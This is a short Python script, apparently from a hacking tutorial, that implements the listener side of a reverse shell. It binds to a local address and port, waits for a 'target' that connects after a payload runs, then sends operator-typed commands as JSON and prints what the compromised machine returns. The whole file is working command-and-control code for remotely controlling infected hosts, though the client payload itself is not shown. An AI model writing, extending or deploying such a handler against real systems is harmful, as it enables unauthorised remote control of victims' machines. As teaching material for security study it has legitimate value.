import socket
import json


# Initialize the socket
# AF_INET uses IPv4 address
# SOCK-STREAM uses TCP
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Bind the IP of the host machine to the socket
sock.bind(('192.168.1.24', 5555))
print('[+] Listening for incoming connections')
# Listen for up to 5 different connections
sock.listen(5)
# Accept the next incoming connection
target, ip = sock.accept()
print(f'[+] Target connected from: {str(ip)}')


# Reliable receive function will get data back from the target
def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


# Reliable send function will send the input command to the target system
def reliable_send(command):
    # Create the json data object from the command
    json_data = json.dumps(command)
    # Encode the data and then send it to the target
    target.send(json_data.encode())


# Communicates with the target that has connnected via payload execution
def target_communication():
    while True:
        command = input(f'* Shell~{str(ip)}: ')
        # TODO add help menu here
        reliable_send(command)
        if command == 'quit':
            break
        else:
            result = reliable_recv()
            print(result)


# Main server program
def main():
    target_communication()


if __name__ == '__main__':
    main()
